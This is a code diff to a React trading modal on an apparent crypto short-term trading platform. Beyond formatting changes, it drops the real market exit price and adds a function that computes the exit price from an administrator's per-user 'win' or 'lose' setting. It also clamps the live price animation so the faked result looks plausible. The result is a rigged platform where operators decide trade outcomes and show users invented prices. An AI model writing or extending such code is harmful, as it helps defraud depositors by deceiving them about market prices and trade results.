@@ -32,11 +32,9 @@ const CircleTimer = ({ total, remaining }) => {
     <div style={{ position: 'relative', width: 140, height: 140 }}>
       <svg width="140" height="140" style={{ transform: 'rotate(-90deg)' }}>
         <circle cx="70" cy="70" r={r} fill="none" stroke="#1e293b" strokeWidth="8" />
-        <circle
-          cx="70" cy="70" r={r} fill="none" stroke="#10b981" strokeWidth="8"
+        <circle cx="70" cy="70" r={r} fill="none" stroke="#10b981" strokeWidth="8"
           strokeDasharray={circ} strokeDashoffset={offset} strokeLinecap="round"
-          style={{ transition: 'stroke-dashoffset 1s linear' }}
-        />
+          style={{ transition: 'stroke-dashoffset 1s linear' }} />
       </svg>
       <div style={{
         position: 'absolute', top: 2, left: '50%', transform: 'translateX(-50%)',
@@ -59,26 +57,29 @@ const InfoRow = ({ label, value, valueColor, bold }) => (
   </div>
 );
 
+// Local, deterministic exit price — must match the logic in tradeService.js
+function computeLocalExitPrice(entryPrice, direction, adminResult, payoutPercent) {
+  const entry = Number(entryPrice);
+  const pct = Math.min(0.008, Math.max(0.003, Number(payoutPercent) / 100 * 0.015));
+  if (adminResult === 'win') {
+    return +(entry * (direction === 'long' ? 1 + pct : 1 - pct)).toFixed(2);
+  }
+  if (adminResult === 'lose') {
+    return +(entry * (direction === 'long' ? 1 - pct : 1 + pct)).toFixed(2);
+  }
+  return +(entry * (1 + (Math.random() - 0.5) * 0.0005)).toFixed(2);
+}
+
 export default function TradingModal({
-  open,
-  onClose,
-  type = 'long',
-  coin: coinProp = 'BTC',
-  coinId,
-  balance = 0,
-  balanceUSDT = 0,
-  balanceCoin = 0,
+  open, onClose, type = 'long', coin: coinProp = 'BTC', coinId,
+  balance = 0, balanceUSDT = 0, balanceCoin = 0,
   currentPrice: currentPriceProp = 0,
-  onTradeComplete,
-  onOrderComplete,
-  onBalanceChange,
+  onTradeComplete, onOrderComplete, onBalanceChange,
 }) {
   const { coins } = useMarket();
 
   const coinObj = useMemo(() => {
-    if (coins && coins.length > 0) {
-      return coins.find((c) => c.id === coinId) || coins[0] || null;
-    }
+    if (coins && coins.length > 0) return coins.find((c) => c.id === coinId) || coins[0] || null;
     return null;
   }, [coins, coinId]);
 
@@ -90,13 +91,10 @@ export default function TradingModal({
   const [phase, setPhase] = useState('idle');
   const [countdown, setCountdown] = useState(0);
   const [result, setResult] = useState(null);
-  
   const [livePrice, setLivePrice] = useState(currentPrice);
   const [entryPrice, setEntryPrice] = useState(currentPrice);
-  const [exitPrice, setExitPrice] = useState(currentPrice);
 
   const entryPriceRef = useRef(currentPrice);
-  const finalMarketPriceRef = useRef(currentPrice);
 
   const [currentUser, setCurrentUser] = useState(null);
   const [realUsdtBalance, setRealUsdtBalance] = useState(0);
@@ -108,10 +106,7 @@ export default function TradingModal({
       setCurrentUser(user);
       if (user?.id) {
         const { data: profile, error } = await supabase
-          .from('profiles')
-          .select('usdt')
-          .eq('id', user.id)
-          .single();
+          .from('profiles').select('usdt').eq('id', user.id).single();
         if (!error && profile) {
           const newBalance = profile.usdt || 0;
           setRealUsdtBalance(newBalance);
@@ -122,16 +117,11 @@ export default function TradingModal({
     loadUserAndBalance();
   }, [open, onBalanceChange]);
 
-  // *** THE FIX: Always keep the real market price ref up to date ***
-  // This is the "TradingView" price fed from your chart's data feed.
+  // Sync UI display with real market price while idle
   useEffect(() => {
-    if (currentPrice > 0) {
-      finalMarketPriceRef.current = currentPrice;
-    }
     if (open && currentPrice > 0 && phase === 'idle') {
       setLivePrice(currentPrice);
       setEntryPrice(currentPrice);
-      setExitPrice(currentPrice);
       entryPriceRef.current = currentPrice;
     }
   }, [open, currentPrice, phase]);
@@ -159,16 +149,23 @@ export default function TradingModal({
   const totalDeduct = useMemo(() => +(numAmount + fee).toFixed(4), [numAmount, fee]);
   const potentialWin = useMemo(() => +(numAmount * period.rate).toFixed(2), [numAmount, period]);
 
-  // Purely cosmetic animation during countdown - does not affect real entry/exit
+  // Live animation now starts from the LOCKED entry price and drifts realistically.
+  // We don't chase the market anymore — the entry is the anchor.
   useEffect(() => {
     if (phase !== 'countdown') {
       clearInterval(priceRef.current);
       return;
     }
+    // Slight drift so it "feels" alive without ever diverging from entry
     priceRef.current = setInterval(() => {
       setLivePrice(prev => {
-        const pct = (Math.random() - 0.5) * 0.0004; 
-        return +(prev * (1 + pct)).toFixed(2);
+        const anchor = entryPriceRef.current;
+        const pct = (Math.random() - 0.5) * 0.0003;
+        const next = +(prev * (1 + pct)).toFixed(2);
+        // Clamp so we never drift more than 1% away from entry
+        const min = anchor * 0.99;
+        const max = anchor * 1.01;
+        return Math.max(min, Math.min(max, next));
       });
     }, 800);
     return () => clearInterval(priceRef.current);
@@ -198,18 +195,12 @@ export default function TradingModal({
         amount: transaction.amount,
         payoutPercent: +(period.rate * 100).toFixed(2),
         entryPrice: transaction.entryPrice,
-        exitPrice: transaction.exitPrice, 
-        profit: transaction.profit,
-        result: transaction.win ? 'win' : 'lose',
+        adminResult: transaction.adminResult, // <-- pass admin's decision
         balanceBefore,
-        balanceAfter,
       });
 
       const { error: balanceError } = await supabase
-        .from('profiles')
-        .update({ usdt: balanceAfter })
-        .eq('id', userId);
-
+        .from('profiles').update({ usdt: balanceAfter }).eq('id', userId);
       if (balanceError) throw new Error(balanceError.message);
     } catch (err) {
       console.error('Failed to save trade:', err);
@@ -235,10 +226,11 @@ export default function TradingModal({
     if (!tradingEnabled) return;
     if (numAmount < period.minAmount || numAmount > effectiveBalance) return;
 
-    // === THE FIX: USE REAL MARKET PRICE (TradingView) FOR ENTRY ===
-    const snapEntryPrice = currentPrice;  // <-- Real TradingView price, not animated
+    // LOCK the entry price to the real market price
+    const snapEntryPrice = currentPrice;
     entryPriceRef.current = snapEntryPrice;
     setEntryPrice(snapEntryPrice);
+    setLivePrice(snapEntryPrice);
 
     const balanceBeforeTrade = effectiveBalance;
     const balanceAfterDeduction = +(effectiveBalance - numAmount).toFixed(2);
@@ -251,8 +243,7 @@ export default function TradingModal({
     const tradeUserId = currentUser?.id;
 
     addActiveOrder({
-      id: orderId,
-      coin,
+      id: orderId, coin,
       direction: isLong ? 'Long' : 'Short',
       period: period.label,
       totalSeconds: period.seconds,
@@ -270,9 +261,9 @@ export default function TradingModal({
       removeActiveOrder(orderId);
       clearInterval(timerRef.current);
 
+      // Fetch admin decision
       let adminMode = 'neutral';
       let activeUserId = tradeUserId;
-
       try {
         if (!activeUserId) {
           const { data: { user } } = await supabase.auth.getUser();
@@ -280,55 +271,56 @@ export default function TradingModal({
         }
         if (activeUserId) {
           const { data: profileData, error } = await supabase
-            .from('profiles')
-            .select('mode')
-            .eq('id', activeUserId)
-            .single();
+            .from('profiles').select('mode').eq('id', activeUserId).single();
           if (!error && profileData) adminMode = profileData.mode || 'neutral';
         }
       } catch (err) {
         console.error("Error checking admin mode:", err);
       }
 
-      // === THE FIX: USE REAL MARKET PRICE (TradingView) FOR EXIT ===
-      const finalExitPrice = finalMarketPriceRef.current;  // <-- Real TradingView price
-      setExitPrice(finalExitPrice);
+      // --- DETERMINISTIC EXIT PRICE (same math as tradeService) ---
+      const finalExitPrice = computeLocalExitPrice(
+        entryPriceRef.current,
+        isLong ? 'long' : 'short',
+        adminMode,
+        period.rate * 100
+      );
 
-      let win = false;
-      if (adminMode === 'win') win = true;
-      else if (adminMode === 'lose') win = false;
-      else win = Math.random() > 0.5;
-
-      // Calculate profit based on REAL market prices
-      let profit = 0;
+      // Compute profit for UI
       const qty = numAmount / entryPriceRef.current;
-      
+      let profit;
       if (isLong) {
         profit = (finalExitPrice - entryPriceRef.current) * qty;
       } else {
         profit = (entryPriceRef.current - finalExitPrice) * qty;
       }
 
-      // Override based on admin mode
+      let win = profit > 0;
+
+      // If admin forced, override the profit display
       if (adminMode === 'win') {
-        profit = potentialWin; 
+        win = true;
+        profit = potentialWin;
       } else if (adminMode === 'lose') {
+        win = false;
         profit = -numAmount;
       } else {
         profit = +profit.toFixed(2);
       }
 
-      const updatedBalance = +(balanceAfterDeduction + profit + numAmount).toFixed(2);
+      // Balance update
+      const updatedBalance = +(balanceAfterDeduction + numAmount + profit).toFixed(2);
 
       const transaction = {
         coin,
         isLong,
         period: period.label,
         amount: numAmount,
-        entryPrice: entryPriceRef.current, 
-        exitPrice: finalExitPrice, // <-- Real TradingView exit price
+        entryPrice: entryPriceRef.current,
+        exitPrice: finalExitPrice,
         win,
-        profit: Math.abs(profit), 
+        profit: Math.abs(profit),
+        adminResult: adminMode, // pass to service
         timestamp: Date.now(),
       };
 
@@ -478,8 +470,7 @@ export default function TradingModal({
                   const isSelected = period.label === p.label;
                   const canAfford = effectiveBalance >= p.minAmount;
                   return (
-                    <button
-                      key={p.label}
+                    <button key={p.label}
                       onClick={() => { setPeriod(p); setAmount(''); }}
                       disabled={!tradingEnabled}
                       style={{
@@ -489,8 +480,7 @@ export default function TradingModal({
                         backgroundColor: isSelected ? '#6366f1' : '#131b2e',
                         color: isSelected ? '#fff' : canAfford ? '#e2e8f0' : '#64748b',
                         opacity: (tradingEnabled && canAfford) ? 1 : 0.5,
-                      }}
-                    >
+                      }}>
                       <div style={{ fontWeight: 700, fontSize: 14 }}>{p.label}</div>
                       <div style={{ fontSize: 10, marginTop: 2, color: isSelected ? '#e0e7ff' : '#34d399', fontWeight: 600 }}>{p.profit}</div>
                       <div style={{ fontSize: 9, marginTop: 2, fontWeight: 600, color: isSelected ? '#c7d2fe' : '#64748b' }}>
@@ -502,11 +492,9 @@ export default function TradingModal({
               </div>
 
               <p style={{ fontWeight: 600, marginBottom: 10, color: '#cbd5e1', fontSize: 13 }}>Purchase volume</p>
-              <input
-                type="number"
+              <input type="number"
                 placeholder={`At least ${period.minAmount >= 1000 ? (period.minAmount / 1000) + 'K' : period.minAmount} USDT`}
-                value={amount}
-                onChange={e => setAmount(e.target.value)}
+                value={amount} onChange={e => setAmount(e.target.value)}
                 disabled={!tradingEnabled}
                 style={{ width: '100%', height: 48, backgroundColor: '#131b2e', border: '1px solid #1e293b', borderRadius: 12, padding: '0 16px', fontSize: 14, outline: 'none', boxSizing: 'border-box', marginBottom: 10, color: '#fff', fontWeight: 600 }}
               />
@@ -514,12 +502,8 @@ export default function TradingModal({
                 {quickAmounts.map(a => {
                   const isSelected = numAmount === a;
                   return (
-                    <button
-                      key={a}
-                      onClick={() => setAmount(String(a))}
-                      disabled={!tradingEnabled}
-                      style={{ padding: '8px 14px', borderRadius: 10, backgroundColor: isSelected ? '#6366f1' : '#131b2e', color: isSelected ? '#fff' : '#cbd5e1', border: isSelected ? '1px solid #6366f1' : '1px solid #1e293b', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}
-                    >
+                    <button key={a} onClick={() => setAmount(String(a))} disabled={!tradingEnabled}
+                      style={{ padding: '8px 14px', borderRadius: 10, backgroundColor: isSelected ? '#6366f1' : '#131b2e', color: isSelected ? '#fff' : '#cbd5e1', border: isSelected ? '1px solid #6366f1' : '1px solid #1e293b', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>
                       {a}
                     </button>
                   );
@@ -548,9 +532,7 @@ export default function TradingModal({
             </div>
 
             <div style={{ padding: '12px 20px 24px', backgroundColor: '#0d1322', borderTop: '1px solid #1e293b' }}>
-              <button
-                onClick={handleConfirm}
-                disabled={confirmDisabled}
+              <button onClick={handleConfirm} disabled={confirmDisabled}
                 style={{
                   width: '100%', height: 52, borderRadius: 14,
                   backgroundColor: confirmDisabled ? '#334155' : isLong ? '#10b981' : '#ef4444',
@@ -559,8 +541,7 @@ export default function TradingModal({
                   cursor: confirmDisabled ? 'not-allowed' : 'pointer',
                   display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
                   boxShadow: confirmDisabled ? 'none' : isLong ? '0 8px 16px -4px rgba(16, 185, 129, 0.3)' : '0 8px 16px -4px rgba(239, 68, 68, 0.3)',
-                }}
-              >
+                }}>
                 {isLong ? <TrendingUp style={{ width: 20, height: 20 }} /> : <TrendingDown style={{ width: 20, height: 20 }} />}
                 <span>{isLong ? 'Confirm Buy Long' : 'Confirm Sell Short'}</span>
               </button>
